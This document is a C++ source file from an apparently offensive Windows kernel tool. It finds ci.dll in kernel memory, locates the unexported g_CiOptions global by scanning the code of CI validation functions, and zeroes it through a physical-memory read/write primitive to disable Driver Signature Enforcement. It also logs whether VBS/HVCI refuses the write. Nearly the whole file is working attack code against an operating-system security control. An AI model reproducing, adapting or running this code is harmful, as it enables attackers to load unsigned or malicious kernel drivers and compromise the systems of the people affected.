#include <windows.h>
#include <stdio.h>
#include <vector>
#include "symbols.h"
#include "window.h"
#include "dse.h"

// Remember the status of a trapped write so the caller can report it.
static ULONG64 ReadKernelPtr(ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = WindowVirtToPhys(cr3, va);
    return pa ? WindowRead64(pa) : 0;
}

// Read kernel virtual memory page-by-page (physical pages are not contiguous).
static bool ReadKernelBytes(ULONG64 cr3, ULONG64 va, void* buffer, ULONG size) {
    BYTE* out = (BYTE*)buffer;
    while (size) {
        ULONG pageOff = (ULONG)(va & 0xFFF);
        ULONG chunk = 0x1000 - pageOff;
        if (chunk > size) chunk = size;

		// The physical page may not be resident, so the translation can fail. The caller must handle that.
        ULONG64 pa = WindowVirtToPhys(cr3, va);
        if (!pa) return false;
        WindowReadBuffer(pa, out, chunk);

		// Advance to the next page.
        out += chunk;
        va += chunk;
        size -= chunk;
    }
    return true;
}

// Walk PsLoadedModuleList and return the loaded image base/size of a module.
static bool FindKernelModule(
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* moduleName, ULONG64* imageBase, ULONG* imageSize
) {
    ULONG64 listHead = offsets->NtoskrnlBase + offsets->PsLoadedModuleList;
    ULONG64 link = ReadKernelPtr(systemCr3, listHead);
    if (!link) return false;

	// The list is circular, so stop when we get back to the head. 
    // Limit the walk to 512 entries to avoid infinite loops.
    int count = 0;
    while (link != listHead && link != 0 && count++ < 512) {
        ULONG64 entryVA = link - offsets->LdrInLoadOrderLinks;

        // BaseDllName is a UNICODE_STRING: Length, MaximumLength, Buffer(+8)
        ULONG64 nameStringVA = entryVA + offsets->LdrBaseDllName;
        ULONG64 nameStringPA = WindowVirtToPhys(systemCr3, nameStringVA);
        if (nameStringPA) {
            USHORT nameLen = (USHORT)WindowRead32(nameStringPA);
            ULONG64 nameBufVA = WindowRead64(nameStringPA + 8);

			// The UNICODE_STRING length is in bytes, so it must be divided by 2 to get the number of wchar_t characters.
            if (nameBufVA && nameLen > 0 && nameLen <= 260) {
                wchar_t name[130] = {};
                ULONG readLen = nameLen < sizeof(name) - 2
                    ? nameLen : (ULONG)(sizeof(name) - 2);
                ULONG64 nameBufPA = WindowVirtToPhys(systemCr3, nameBufVA);
                if (nameBufPA) {
                    WindowReadBuffer(nameBufPA, name, readLen);
                    name[readLen / sizeof(wchar_t)] = 0;

					// Compare the module name case-insensitively. If it matches, read the LdrDllBase and LdrSizeOfImage fields to get the image base and size.
                    if (_wcsicmp(name, moduleName) == 0) {
                        ULONG64 basePA = WindowVirtToPhys(systemCr3, entryVA + offsets->LdrDllBase);
                        ULONG64 sizePA = WindowVirtToPhys(systemCr3, entryVA + offsets->LdrSizeOfImage);
                        if (basePA && sizePA) {
                            *imageBase = WindowRead64(basePA);
                            *imageSize = WindowRead32(sizePA);
                            return *imageBase != 0;
                        }
                    }
                }
            }
        }

		// Advance to the next entry in the list. The LdrInLoadOrderLinks field is a LIST_ENTRY structure, which has Flink and Blink pointers. 
        // The Flink pointer points to the next entry in the list.
        link = ReadKernelPtr(systemCr3, link);
    }
    return false;
}

// Structure representing a PE section.
struct PeSection {
    ULONG64 va;
    ULONG vsize;
    bool writable;
};

// Read the PE headers of a module and collect its sections.
// The sections are returned in the 'sections' vector, and the image size is returned in 'imageSize'.
static bool ReadPeSections(ULONG64 cr3, ULONG64 base, ULONG* imageSize,
                           std::vector<PeSection>& sections) {
    BYTE hdr[0x1000] = {};
    if (!ReadKernelBytes(cr3, base, hdr, sizeof(hdr))) return false;

	// The PE headers consist of an IMAGE_DOS_HEADER followed by an IMAGE_NT_HEADERS structure. 
    // The IMAGE_DOS_HEADER contains the e_lfanew field, which is the offset to the IMAGE_NT_HEADERS.
    // The IMAGE_NT_HEADERS contains the SizeOfImage field in the OptionalHeader, which gives the total size of the image in memory.
    // The sections are described by an array of IMAGE_SECTION_HEADER structures that follow the IMAGE_NT_HEADERS.
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hdr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if ((ULONG)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > sizeof(hdr)) return false;

	// The IMAGE_NT_HEADERS structure contains the Signature field, which should be equal to IMAGE_NT_SIGNATURE.
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(hdr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

	// The SizeOfImage field in the OptionalHeader gives the total size of the image in memory, which is returned to the caller.
    *imageSize = nt->OptionalHeader.SizeOfImage;

	// The sections are described by an array of IMAGE_SECTION_HEADER structures that follow the IMAGE_NT_HEADERS.
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (UINT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if ((BYTE*)(sec + 1) > hdr + sizeof(hdr)) break;
        PeSection s = {};
        s.va = sec->VirtualAddress;
        s.vsize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        s.writable = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        sections.push_back(s);
    }
	// The sections vector is filled with the virtual address, virtual size, and writable flag for each section in the PE image. 
    // The function returns true if at least one section was found, and false otherwise.
    return !sections.empty();
}

// Check if a given RVA is within a writable section of the PE image. 
// The sections vector contains the PE sections, and the rva parameter is the RVA to check.
static bool IsWritableRva(const std::vector<PeSection>& sections, ULONG64 rva) {
    for (const auto& s : sections)
        if (rva >= s.va && rva < s.va + s.vsize && s.writable) return true;
    return false;
}

// Collect target RVAs of RIP-relative memory operands in a code buffer.
static void CollectRipRefs(const BYTE* code, ULONG size, ULONG64 funcRva,
                           std::vector<ULONG64>& out) {
    for (ULONG i = 0; i + 6 <= size; i++) {
        ULONG p = i;
        if (code[p] >= 0x40 && code[p] <= 0x4F) {
            p++;
            if (p + 6 > size) break;
        }

		// The instruction must have a ModRM byte, and the ModRM must specify the RIP-relative addressing mode (mod=00, rm=101). 
        // The displacement is a 32-bit signed value, and the effective address is calculated relative to the next instruction's address. 
        // The immediate size varies depending on the opcode, so we need to account for that when calculating the end of the instruction.
        ULONG immSize;
        switch (code[p]) {
            case 0x8B: case 0x89: case 0x8D:
            case 0x39: case 0x3B: case 0x85:
                immSize = 0; break;
            case 0xC7: case 0xF7: case 0x81:
                immSize = 4; break;
            case 0xF6: case 0x83:
                immSize = 1; break;
            default:
                continue;
        }

		// The ModRM byte is located immediately after the opcode (and any REX prefix).
        ULONG modrmPos = p + 1;
        if (modrmPos + 5 > size) break;
        if ((code[modrmPos] & 0xC7) != 0x05) continue; // mod=00, rm=101 => RIP-relative

		// The displacement is a 32-bit signed value located immediately after the ModRM byte.
        LONG disp = *(LONG*)(code + modrmPos + 1);
        ULONG64 endRva = funcRva + modrmPos + 5 + immSize;
        out.push_back(endRva + (ULONG64)(LONG64)disp);

		// Advance the index to the end of the instruction to avoid overlapping matches. 
        // The instruction length is 1 byte for the opcode, 1 byte for the ModRM, 4 bytes for the displacement, and any additional immediate bytes.
        i = modrmPos + 4 + immSize;
    }
}

// Locate g_CiOptions. The symbol is not in the public PDB, so resolve the
// exported CI validation functions and find the writable global they share.
static bool FindCiOptionsRva(ULONG64 cr3, ULONG64 ciBase, ULONG* outImageSize,
                             ULONG64* outRva) {
    std::vector<PeSection> sections;
    ULONG imageSize = 0;
    if (!ReadPeSections(cr3, ciBase, &imageSize, sections)) {
        printf("[-] Failed to read ci.dll PE headers\n");
        return false;
    }
    *outImageSize = imageSize;

	// The CI validation functions are exported, so their RVAs can be resolved from the export directory. 
    // The writable global g_CiOptions is not exported, but it is referenced by both functions. 
    // By collecting the RIP-relative references in both functions and filtering for writable RVAs, we can find the common writable global they share, which is g_CiOptions.
    const char* funcs[] = { "CiValidateImageHeader", "CiValidateImageData" };
    std::vector<std::vector<ULONG64>> sets;

	// For each CI validation function, resolve its RVA, read the first 0x300 bytes of code, collect RIP-relative references, and filter for writable RVAs.
    for (const char* fn : funcs) {
        ULONG64 funcRva = 0;
        if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", fn, &funcRva))
            continue;

		// Read the first 0x300 bytes of the function to collect RIP-relative references.
        BYTE code[0x300] = {};
        if (!ReadKernelBytes(cr3, ciBase + funcRva, code, sizeof(code)))
            continue;

		// Collect RIP-relative references in the function and filter for writable RVAs.
        std::vector<ULONG64> refs;
        CollectRipRefs(code, sizeof(code), funcRva, refs);

		// Filter the references to only include those that are within the image size and are writable according to the PE sections.
        std::vector<ULONG64> filtered;
        for (ULONG64 r : refs)
            if (r < imageSize && IsWritableRva(sections, r))
                filtered.push_back(r);

		// If any writable references were found, add them to the sets vector for later comparison.
        if (!filtered.empty()) {
            printf("[*] %s: %zu writable data reference(s)\n", fn, filtered.size());
            sets.push_back(filtered);
        }
    }

	// If no writable references were found in either function, report an error and return false.
    if (sets.empty()) {
        printf("[-] No CI validation references found\n");
        return false;
    }

	// If both functions have writable references, find the common writable reference(s) between them.
    std::vector<ULONG64> candidates = sets[0];
    if (sets.size() >= 2) {
        std::vector<ULONG64> common;
        for (ULONG64 r : sets[0])
            for (ULONG64 s : sets[1])
                if (r == s) { common.push_back(r); break; }
        if (!common.empty()) candidates = common;
        else {
            printf("[-] CI functions disagree on g_CiOptions; refusing to patch\n");
            return false;
        }
    }

	// If there is exactly one common writable reference, it is likely g_CiOptions. 
    // If there are multiple candidates, report an error and return false.
    if (candidates.size() != 1) {
        printf("[-] Ambiguous g_CiOptions (%zu candidates). Refusing to patch\n",
               candidates.size());
        for (ULONG64 r : candidates) printf("      candidate RVA 0x%llX\n", r);
        return false;
    }

	// If we reach this point, we have found a single candidate for g_CiOptions. Report it and return true.
    *outRva = candidates[0];
    return true;
}

// Remember the status of a trapped write so the caller can report it. The
// filter runs for first chance too, so only the final refusal matters.
static int DseWriteFilter(EXCEPTION_POINTERS* ep, ULONG_PTR code, ULONG* outCode) {
    (void)ep;
    if (outCode) *outCode = (ULONG)code;
    return EXCEPTION_EXECUTE_HANDLER;
}

// Locate ci.dll!g_CiOptions before anything ram-expensive happens, so the DIA work
// runs while memory is plentiful.
bool ResolveCiOptionsRva(ULONG64* outRva) {
    printf("[*] Resolving ci.dll!g_CiOptions...\n");

	// The symbol is not in the public PDB, so resolve the exported CI validation
    ULONG64 rva = 0;
    if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", "g_CiOptions", &rva) || !rva) {
        // Not fatal: DisableDSE() can still find it structurally once the window
        // is up. Doing that fallback here would need the window this early,
        // which is the ordering problem being avoided.
        printf("[-] g_CiOptions not resolved up front; DisableDSE will locate it structurally\n");
        *outRva = 0;
        return false;
    }

	// The symbol is exported, but it is not writable in the public PDB. The symbol is writable in the private PDB, so check that the resolved RVA is in a writable section of ci.dll. 
    // If it is not writable, report an error and return false.
    printf("[+] g_CiOptions RVA: 0x%llX\n", rva);
    *outRva = rva;
    return true;
}

// Disable DSE by writing 0 to ci.dll!g_CiOptions. 
// The write may be refused under VBS/HVCI, in which case the caller report it and continue.
bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets, bool haveRva, ULONG64 rva) {
    printf("\n[*] Disabling DSE (g_CiOptions)...\n");

	// Locate ci.dll in the kernel's loaded module list and find g_CiOptions.
    ULONG64 ciBase = 0;
    ULONG ciSize = 0;
    if (!FindKernelModule(systemCr3, offsets, L"ci.dll", &ciBase, &ciSize)) {
        printf("[-] ci.dll not found in PsLoadedModuleList\n");
        return false;
    }
    printf("[+] ci.dll: 0x%llX (%u KB)\n", ciBase, ciSize / 1024);

    // Resolved up front, while memory was plentiful; only the structural
    // fallback needs the window and therefore runs here.
    if (!haveRva || !rva) {
        if (!FindCiOptionsRva(systemCr3, ciBase, &ciSize, &rva)) {
            printf("[-] Could not locate g_CiOptions\n");
            return false;
        }
    }
    printf("[+] g_CiOptions RVA: 0x%llX\n", rva);

	// The write is the only thing here that can fault, and under VBS/HVCI that fault is not always serviceable, so kernel data protection can refuse it. 
    // Report the refusal instead of ending the run. (Almost) everything else has already completed by this point.
    ULONG64 pa = WindowVirtToPhys(systemCr3, ciBase + rva);
    if (!pa) {
        printf("[-] Failed to translate g_CiOptions (VA 0x%llX)\n", ciBase + rva);
        return false;
    }
    printf("[*] g_CiOptions VA 0x%llX -> PA 0x%llX%s%s\n", ciBase + rva, pa,
           WindowContains(pa) ? "" : "  (OUTSIDE the window)",
           pa < WindowResidentExtent() ? " (resident)" : " (not resident)");

	// Shows whether the write actually stuck, and if not, what the value is now.
    ULONG before = WindowRead32(pa);
    printf("[*] g_CiOptions = 0x%08X\n", before);
    if (before == 0)
        printf("[!] DSE Already disabled (was not enforcing)\n");

    ULONG zero = 0;

    // The write is the only thing here that can fault, and under VBS/HVCI that
    // fault is not always serviceable - kernel data protection can refuse it.
    // Report the refusal instead of ending the run; everything else has already
    // completed by this point.
    bool wrote = true;
    ULONG writeCode = 0;
    __try {
        WindowWriteBuffer(pa, &zero, sizeof(zero));
    }
    __except (DseWriteFilter(GetExceptionInformation(), GetExceptionCode(), &writeCode)) {
        wrote = false;
    }

	// If the write was refused, report it and continue. The caller can decide whether to treat it as fatal.
    if (!wrote) {
        printf("[-] The write to g_CiOptions was refused (0x%08lX); DSE left as it is\n",
               (unsigned long)writeCode);
        printf("[-] Under VBS/HVCI kernel data protection this is expected\n");
        return false;
    }

    ULONG after = WindowRead32(pa);
    if (after == 0) {
        if (before == 0) printf("[+] g_CiOptions still 0 (unchanged)\n");
        else printf("[+] DSE disabled (0x%08X -> 0)\n", before);
        return true;
    }

    printf("[-] Write did not stick (0x%08X). KDP/HVCI may have protected it\n", after);
    return false;
}
